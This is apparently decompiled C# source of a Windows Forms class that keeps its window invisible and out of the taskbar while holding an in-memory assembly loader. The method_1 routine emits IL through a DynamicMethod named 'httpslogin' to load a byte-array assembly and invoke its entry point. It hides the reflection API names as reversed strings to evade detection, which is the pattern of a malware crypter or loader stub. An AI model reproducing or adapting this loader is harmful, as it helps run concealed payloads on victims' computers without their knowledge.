using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

[DesignerGenerated]
public class Form : Form
{
	public IContainer icontainer_0;

	internal Timer timer_0;

	internal TextBox textBox_0;

	internal Button button_0;

	internal Label label_0;

	internal Label label_1;

	internal Label label_2;

	internal Label label_3;

	internal Panel panel_0;

	internal ProgressBar progressBar_0;

	public Form()
	{
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	public void InitializeComponent()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_022d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0233: Expected O, but got Unknown
		((Control)this).set_Visible(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Opacity(0.0);
		vmethod_1(new TextBox());
		vmethod_3(new Button());
		vmethod_5(new Label());
		vmethod_7(new Label());
		vmethod_9(new Label());
		vmethod_11(new Label());
		vmethod_13(new Panel());
		vmethod_15(new ProgressBar());
		((Control)this).SuspendLayout();
		TextBox obj = vmethod_0();
		Point location = new Point(12, 23);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("TextBox1");
		vmethod_0().set_Text("");
		TextBox obj2 = vmethod_0();
		Size size = new Size(100, 20);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(0);
		Button obj3 = vmethod_2();
		location = new Point(12, 49);
		((Control)obj3).set_Location(location);
		((Control)vmethod_2()).set_Name("Button1");
		Button obj4 = vmethod_2();
		size = new Size(75, 23);
		((Control)obj4).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(1);
		((ButtonBase)vmethod_2()).set_Text("Button1");
		((ButtonBase)vmethod_2()).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 262);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_12());
		((Control)this).get_Controls().Add((Control)(object)vmethod_10());
		((Control)this).get_Controls().Add((Control)(object)vmethod_8());
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).set_Name("Form");
		((Form)this).set_Text("Form");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
		((Form)this).set_Opacity(0.0);
		Timer val = (timer_0 = new Timer());
		((Form)this).set_ShowInTaskbar(false);
		timer_0.set_Interval(2000);
	}

	private object method_0(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public object method_1(byte[] byte_0, object[] object_0, string string_0, string string_1)
	{
		DynamicMethod dynamicMethod = new DynamicMethod("httpslogin", typeof(object), new Type[4]
		{
			typeof(byte[]),
			typeof(object[]),
			typeof(string),
			typeof(string)
		});
		ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
		Label label = iLGenerator.DefineLabel();
		iLGenerator.DeclareLocal(typeof(Assembly));
		iLGenerator.Emit(OpCodes.Ldarg_0);
		iLGenerator.EmitCall(OpCodes.Call, typeof(Assembly).GetMethod(Conversions.ToString(method_0("daoL")), new Type[1] { typeof(byte[]) }), null);
		iLGenerator.Emit(OpCodes.Stloc_0);
		iLGenerator.Emit(OpCodes.Ldarg_2);
		iLGenerator.Emit(OpCodes.Brfalse_S, label);
		iLGenerator.Emit(OpCodes.Ldarg_3);
		iLGenerator.Emit(OpCodes.Brfalse_S, label);
		iLGenerator.Emit(OpCodes.Ldloc_0);
		iLGenerator.Emit(OpCodes.Ldarg_2);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Assembly).GetMethod(Conversions.ToString(method_0("epyTteG")), new Type[1] { typeof(string) }), null);
		iLGenerator.Emit(OpCodes.Ldarg_3);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Type).GetMethod(Conversions.ToString(method_0("dohteMteG")), new Type[1] { typeof(string) }), null);
		iLGenerator.Emit(OpCodes.Ldnull);
		iLGenerator.Emit(OpCodes.Ldarg_1);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(MethodBase).GetMethod(Conversions.ToString(method_0("ekovnI")), new Type[2]
		{
			typeof(object),
			typeof(object[])
		}), null);
		iLGenerator.Emit(OpCodes.Ret);
		iLGenerator.MarkLabel(label);
		iLGenerator.Emit(OpCodes.Ldloc_0);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Assembly).GetProperty(Conversions.ToString(method_0("tnioPyrtnE")))!.GetGetMethod(), null);
		iLGenerator.Emit(OpCodes.Ldnull);
		iLGenerator.Emit(OpCodes.Ldarg_1);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(MethodBase).GetMethod(Conversions.ToString(method_0("ekovnI")), new Type[2]
		{
			typeof(object),
			typeof(object[])
		}), null);
		iLGenerator.Emit(OpCodes.Ret);
		return dynamicMethod.Invoke(null, new object[4] { byte_0, object_0, string_0, string_1 });
	}

	[SpecialName]
	internal virtual TextBox vmethod_0()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(TextBox textBox_1)
	{
		TextBox val = (textBox_0 = textBox_1);
	}

	[SpecialName]
	internal virtual Button vmethod_2()
	{
		return button_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Button button_1)
	{
		Button val = (button_0 = button_1);
	}

	[SpecialName]
	internal virtual Label vmethod_4()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(Label label_4)
	{
		Label val = (label_0 = label_4);
	}

	[SpecialName]
	internal virtual Label vmethod_6()
	{
		return label_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_7(Label label_4)
	{
		Label val = (label_1 = label_4);
	}

	[SpecialName]
	internal virtual Label vmethod_8()
	{
		return label_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_9(Label label_4)
	{
		Label val = (label_2 = label_4);
	}

	[SpecialName]
	internal virtual Label vmethod_10()
	{
		return label_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_11(Label label_4)
	{
		Label val = (label_3 = label_4);
	}

	[SpecialName]
	internal virtual Panel vmethod_12()
	{
		return panel_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_13(Panel panel_1)
	{
		Panel val = (panel_0 = panel_1);
	}

	[SpecialName]
	internal virtual ProgressBar vmethod_14()
	{
		return progressBar_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_15(ProgressBar progressBar_1)
	{
		ProgressBar val = (progressBar_0 = progressBar_1);
	}
}
